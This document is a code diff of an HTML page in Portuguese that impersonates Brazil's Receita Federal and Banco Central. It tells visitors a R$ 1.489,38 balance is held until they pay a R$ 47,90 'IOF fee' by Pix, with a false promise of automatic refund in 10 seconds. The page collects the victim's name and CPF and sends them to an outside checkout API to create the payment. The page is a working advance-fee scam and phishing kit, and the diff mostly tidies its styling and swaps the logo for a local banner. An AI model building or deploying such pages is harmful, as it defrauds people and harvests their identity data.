@@ -7,142 +7,57 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
     
     <style>
-        :root {
-            --receita-blue: #0038a9; /* Azul Oficial */
-            --green: #28a745;
-            --bg-gray: #f8f9fa;
-            --border: #e9ecef;
-            --text-dark: #212529;
-        }
-
+        :root { --green: #28a745; --bg-gray: #f8f9fa; --border: #e9ecef; --text-dark: #212529; }
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Inter', sans-serif; background-color: #fff; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #fff;
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* --- HEADER AZUL (ESTILO BANNER) --- */
+        /* HEADER SEM MARGEM */
         .app-header {
-            background-color: var(--receita-blue);
             width: 100%;
-            padding: 20px 0;
             display: flex;
-            align-items: center;
             justify-content: center;
+            background-color: #0038a9; /* Fundo azul de segurança */
             box-shadow: 0 4px 15px rgba(0, 56, 169, 0.3);
             position: sticky;
             top: 0;
             z-index: 100;
         }
         
-        /* LOGO OFICIAL (Link Direto Blindado) */
-        .logo-img {
-            height: 48px; /* Tamanho grande para legibilidade */
-            width: auto;
+        /* A IMAGEM LOCAL */
+        .banner-img {
+            width: 100%;
+            height: auto;
+            max-height: 100px; /* Limita a altura para não ficar gigante */
+            object-fit: contain; /* Ajusta a imagem sem distorcer */
             display: block;
-            /* O filtro abaixo inverte as cores: O que é azul vira branco */
-            filter: brightness(0) invert(1);
-            /* Garante renderização suave */
-            -webkit-font-smoothing: antialiased;
         }
 
-        /* --- CORPO --- */
-        .content {
-            flex: 1;
-            padding: 25px 20px;
-            display: flex;
-            flex-direction: column;
-        }
-
+        .content { flex: 1; padding: 25px 20px; display: flex; flex-direction: column; }
         .title-hero { margin-bottom: 25px; text-align: center; }
         .title-hero h1 { margin: 0 0 8px; font-size: 20px; color: var(--text-dark); letter-spacing: -0.5px; font-weight: 800; }
         .title-hero p { margin: 0; font-size: 14px; color: #6c757d; }
-
-        /* RESUMO */
-        .summary-card {
-            background: var(--bg-gray);
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 25px;
-            border: 1px solid var(--border);
-        }
+        .summary-card { background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 25px; border: 1px solid var(--border); }
         .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; color: #495057; }
         .row strong { color: var(--text-dark); }
-        
-        .total-row {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px dashed #ced4da;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+        .total-row { margin-top: 15px; padding-top: 15px; border-top: 1px dashed #ced4da; display: flex; justify-content: space-between; align-items: center; }
         .total-label { font-size: 14px; font-weight: 700; color: var(--text-dark); }
         .total-value { font-size: 22px; font-weight: 800; color: var(--green); }
-
-        /* AVISO */
-        .refund-notice {
-            background: #e3f2fd;
-            border: 1px solid #90caf9;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 25px;
-            display: flex;
-            gap: 12px;
-            align-items: flex-start;
-        }
+        .refund-notice { background: #e3f2fd; border: 1px solid #90caf9; padding: 15px; border-radius: 8px; margin-bottom: 25px; display: flex; gap: 12px; align-items: flex-start; }
         .refund-text { font-size: 13px; color: #0d47a1; line-height: 1.4; }
-
-        /* FORMULARIO */
         .form-group { margin-bottom: 15px; }
         .label { font-size: 12px; font-weight: 600; color: #495057; margin-bottom: 6px; display: block; text-transform: uppercase; }
-        .input {
-            width: 100%;
-            padding: 16px;
-            border: 1px solid #ced4da;
-            border-radius: 8px;
-            font-size: 16px;
-            background: #fff;
-        }
-        .input:focus { border-color: var(--receita-blue); box-shadow: 0 0 0 3px rgba(0, 56, 169, 0.1); }
-
-        /* BOTAO */
-        .btn-main {
-            width: 100%;
-            padding: 18px;
-            background: var(--green);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 700;
-            text-transform: uppercase;
-            box-shadow: 0 4px 15px rgba(40,167,69,0.3);
-            margin-top: 10px;
-            cursor: pointer;
-        }
-        
+        .input { width: 100%; padding: 16px; border: 1px solid #ced4da; border-radius: 8px; font-size: 16px; background: #fff; }
+        .input:focus { border-color: #0038a9; box-shadow: 0 0 0 3px rgba(0, 56, 169, 0.1); }
+        .btn-main { width: 100%; padding: 18px; background: var(--green); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; box-shadow: 0 4px 15px rgba(40,167,69,0.3); margin-top: 10px; cursor: pointer; }
         .footer-info { text-align: center; margin-top: 25px; color: #adb5bd; font-size: 11px; }
-
-        /* MODAL */
         #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
         .qr-img { width: 220px; display: block; margin: 20px 0; border: 1px solid #eee; border-radius: 8px; }
         .pix-code { background: #f8f9fa; padding: 15px; width: 100%; font-size: 11px; word-break: break-all; text-align: center; border-radius: 8px; margin-bottom: 20px; color: #555; }
     </style>
 </head>
 <body>
-
     <div class="app-header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" 
-             class="logo-img" 
-             alt="Receita Federal"
-             referrerpolicy="no-referrer">
+        <img src="/banner.jpg" class="banner-img" alt="Receita Federal">
     </div>
 
     <div class="content">
@@ -150,49 +65,30 @@
             <h1>Liberação de Valores</h1>
             <p>Regularize a taxa de IOF para receber.</p>
         </div>
-
         <div class="summary-card">
             <div class="row"><span>Saldo Retido</span><strong>R$ 1.489,38</strong></div>
             <div class="row"><span>Taxa (IOF)</span><strong style="color: #dc3545;">R$ 47,90</strong></div>
-            <div class="total-row">
-                <span class="total-label">Você paga agora:</span>
-                <span class="total-value">R$ 47,90</span>
-            </div>
+            <div class="total-row"><span class="total-label">Você paga agora:</span><span class="total-value">R$ 47,90</span></div>
         </div>
-
         <div class="refund-notice">
-            <div class="refund-text">
-                <strong>Reembolso Automático:</strong> Os R$ 47,90 retornarão para sua conta em <strong>10 segundos</strong> após a confirmação.
-            </div>
+            <div class="refund-text"><strong>Reembolso Automático:</strong> Os R$ 47,90 retornarão para sua conta em <strong>10 segundos</strong>.</div>
         </div>
-
-        <div class="form-group">
-            <label class="label">Nome Completo</label>
-            <input type="text" id="nome" class="input" placeholder="Digite seu nome">
-        </div>
-        <div class="form-group">
-            <label class="label">CPF</label>
-            <input type="tel" id="cpf" class="input" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)">
-        </div>
-
+        <div class="form-group"><label class="label">Nome Completo</label><input type="text" id="nome" class="input" placeholder="Digite seu nome"></div>
+        <div class="form-group"><label class="label">CPF</label><input type="tel" id="cpf" class="input" placeholder="000.000.000-00" maxlength="14" oninput="mask(this)"></div>
         <button class="btn-main" onclick="gerarPixIOF()">PAGAR TAXA E LIBERAR</button>
-
         <div class="footer-info">Banco Central do Brasil • Certificado Digital SSL</div>
     </div>
 
     <div id="qr-screen">
-        <h3>Pagamento Seguro</h3>
-        <p style="color:#666; font-size:14px;">Use o app do seu banco.</p>
-        <img id="qr-image" class="qr-img">
-        <div id="pix-copia" class="pix-code"></div>
+        <h3>Pagamento Seguro</h3><p style="color:#666;font-size:14px;">Use o app do seu banco.</p>
+        <img id="qr-image" class="qr-img"><div id="pix-copia" class="pix-code"></div>
         <button class="btn-main" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
-        <div id="msg-sucesso" style="margin-top:20px; color:green; display:none; font-weight:bold;">PAGAMENTO APROVADO!</div>
+        <div id="msg-sucesso" style="margin-top:20px;color:green;display:none;font-weight:bold;">PAGAMENTO APROVADO!</div>
     </div>
 
     <script>
         const API_URL = "https://checkout-pix-profissional.onrender.com";
         function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
-        
         async function gerarPixIOF() {
             const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-main');
             if(n.length<3||c.length<11) return alert("Preencha todos os dados.");
